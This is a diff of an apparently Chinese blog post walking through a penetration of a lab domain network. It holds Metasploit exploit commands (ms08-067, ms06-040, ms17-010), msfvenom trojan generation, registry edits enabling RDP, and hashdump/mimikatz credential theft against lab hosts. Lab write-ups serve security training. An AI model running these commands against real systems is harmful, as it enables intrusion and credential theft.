-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172615660.png" alt="image-20210809172615660"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172615660.png" class title="image-20210809172615660">
+
 <p>由于此时的荷载直接就进入cmd窗口并不能使用工具，而且该权限为管理员权限，有两条思路:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.添加新用户将其放入管理员用户组中以管理员的权限执行(添加用户原因是因为我们不知道管理员的密码无法登录)，然后开通3389(远程桌面)、22(ssh端口)等端口，通过连接前面的端口服务将生成的后台木马传入目标主机，然后使用msf等待上线。使用mimikatz、hashdump等来读内存和注册表中的密码，因为域内该主机的系统是Winserver 2008,默认存储明文密码，不需要进行sha1解密等</span><br><span class="line"></span><br><span class="line">2.寻找其他攻击载荷，直接通过msf拿到session</span><br></pre></td></tr></table></figure>
 
@@ -337,11 +432,20 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;              ###查询注册表键值</span><br><span class="line"></span><br><span class="line">reg delete &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections     ###删除注册表键值</span><br><span class="line"></span><br><span class="line">reg add     &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d   ###添加注册表键值修改FdenyTSConnections键值</span><br></pre></td></tr></table></figure>
 
 <p>这是原来的注册表中的fDenyTSConnections 为0x1(十六进制)，当该值为1时，表示3389服务没有开启</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809142515031.png" alt="image-20210809142515031"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809142515031.png" class title="image-20210809142515031">
+
+
+
 <p>修改目标键值后，该键值为0，如下图:</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143417396.png" alt="image-20210809143417396"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143417396.png" class title="image-20210809143417396">
+
 <p>可以看到3389端口开启</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143459976.png" alt="image-20210809143459976"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143459976.png" class title="image-20210809143459976">
+
+
+
+
+
 <p>连接远程桌面有两种方式:</p>
 <p>1.返回到msf中使用rdesktop命令连接目标主机的3389端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop   -a  16 -r disk:share=/root/shell  192.168.52.141   -u haoyun   -p  Yzt096877</span><br></pre></td></tr></table></figure>
@@ -354,7 +458,10 @@
 
 <p>2.通过venom工具开启个代理，使用proxychains配置代理连接</p>
 <p>venom连接成功后，开启代理9999端口</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155333106.png" alt="image-20210809155333106"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155333106.png" class title="image-20210809155333106">
+
+
+
 <p>然后配置proxychains配置文件，设置代理ip和端口为127.0.0.1 999</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim   /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">在配置文件最后一行修改为自己的代理端口</span><br><span class="line">socks5  127.0.0.1  9999         </span><br></pre></td></tr></table></figure>
 
@@ -364,7 +471,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains   rdesktop  192.168.52.141  -r disk:share=/root/shell</span><br></pre></td></tr></table></figure>
 
 <p>输入账号密码后，连接成功</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155853825.png" alt="image-20210809155853825"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155853825.png" class title="image-20210809155853825">
+
+
+
 <p>将msfvenom生成的木马通过远程桌面传入目标主机</p>
 <p>这里使用上面的反弹shell连接失败，没有返回通道(因为内网主机无法通过跳板机来连接攻击主机，而只有攻击主机才能去连接内网主机，所以反向shell不能使用)。所以使用正向连接荷载生成木马bind.exe，将其上传到win2003上</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp   ARCH=x86   PLATFROM=WIN Rhost=192.168.52.141 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>
@@ -375,10 +485,16 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use  exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br></pre></td></tr></table></figure>
 
 <p>连接成功，管道打开</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809171049187.png" alt="image-20210809171049187"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809171049187.png" class title="image-20210809171049187">
+
+
+
 <p><strong>2.使用相关荷载攻击</strong></p>
 <p>通过在漏洞库中搜索win2003相关的漏洞</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172910901.png" alt="image-20210809172910901"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172910901.png" class title="image-20210809172910901">
+
+
+
 <p>这里尝试ms08-067和ms06_040进行测试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注:MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta</span><br></pre></td></tr></table></figure>
 
@@ -388,12 +504,18 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search ms08-067          ###搜索相关模块</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/bind_tcp    ###使用正向shell荷载</span><br><span class="line"></span><br><span class="line">set rhost 192.168.52.1141           ###设置目标主机Ip地址</span><br></pre></td></tr></table></figure>
 
 <p>攻击成功，管道打开</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809173703941.png" alt="image-20210809173703941"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809173703941.png" class title="image-20210809173703941">
+
+
+
 <p><strong>2.2 ms06-040漏洞利用</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search  ms06-040</span><br><span class="line"></span><br><span class="line">use  exploit/windows/smb/ms06_040_netapi</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost    192.168.52.141</span><br><span class="line"></span><br><span class="line">set target  5</span><br></pre></td></tr></table></figure>
 
 <p>漏洞利用成功，攻击成功，管道打开</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809174522308.png" alt="image-20210809174522308"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809174522308.png" class title="image-20210809174522308">
+
+
+
 <p><strong>2.3 ms03-026漏洞利用</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞实质上影响的是使用RPC的DCOM接口，此接口处理由客户端机器发送给服务器的DCOM对象激活请求(如UNC路径)。攻击者通过向目标发送畸形  RPC  DCOM请求来利用这些漏洞。成功利用此漏洞可以以本地系统权限执行任意指令。攻击者可以在系统上执行任意操作 ，如安装程序、查看或更改、删除数据或创建系统管理员权限的帐户</span><br></pre></td></tr></table></figure>
 
@@ -402,7 +524,10 @@
 
 
 <p>漏洞利用成功，管道打开</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175300540.png" alt="image-20210809175300540"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175300540.png" class title="image-20210809175300540">
+
+
+
 <h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><p>如下获取用户账号和密码hash值</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">或者</span><br><span class="line">run  post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
 
@@ -410,7 +535,10 @@
 
 <p>可以看到目标主机的用户账号和密码hash值</p>
 <p>数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175750389.png" alt="image-20210809175750389"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175750389.png" class title="image-20210809175750389">
+
+
+
 <p>由于windows2008之前的操作系统密码存储都是以明文形式的，直接加载mimikatz模块后使用wdigest进行抓取</p>
 <h4 id="域控主机获取"><a href="#域控主机获取" class="headerlink" title="域控主机获取"></a>域控主机获取</h4><h4 id="漏洞检测利用-1"><a href="#漏洞检测利用-1" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>在之前的信息收集中，得到域控主机开放445和139端口，猜测也有可能存在ms17-010漏洞，对其进行漏洞检测</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/smb/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
@@ -418,12 +546,18 @@
 
 
 <p>检测出来可能存在ms17-010漏洞</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810113004761.png" alt="image-20210810113004761"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810113004761.png" class title="image-20210810113004761">
+
+
+
 <p>然后检测是否是管理员权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <p>可以看到为管理员账户</p>
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810120321187.png"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810120321187.png" class>
+
+
+
 <p>使用上面的ms17-010的模块都没有返回管道，建立会话失败</p>
 <p>域控主机开放137，139，445端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果开启了137端口（wmi）首先还是建议用wmi , 可以直接利用`auxiliary/scanner/smb/impacket/wmiexec`来代码执行，就可以来开启3389 ，以及配置防火墙等。</span><br><span class="line"></span><br><span class="line">如果开启了`139，445`端口，可以先尝试用exploit/windows/smb/pspexec 来登录，弹正向shell.然后代码执行开启3389，配置防火墙</span><br></pre></td></tr></table></figure>
@@ -437,7 +571,10 @@
 <p>下面使用wmiexec攻击模块</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/impacket/wmicexec</span><br><span class="line">set rhost  192.168.52.138</span><br><span class="line">set SMBPass  域控密码</span><br><span class="line">set SMBUser  域控账号</span><br><span class="line">set command  执行的命令</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810142402809.png" alt="image-20210810142402809"></p>
+<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810142402809.png" class title="image-20210810142402809">
+
+
+
 <p>可以看到输入的命令执行成功，这样的话，可以开启远程桌面和使用共享文件将木马复制到域控主机上，然后开启正向shell监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\192.168.52.140\shell\shell.exe C:\1.exe</span><br></pre></td></tr></table></figure>
 
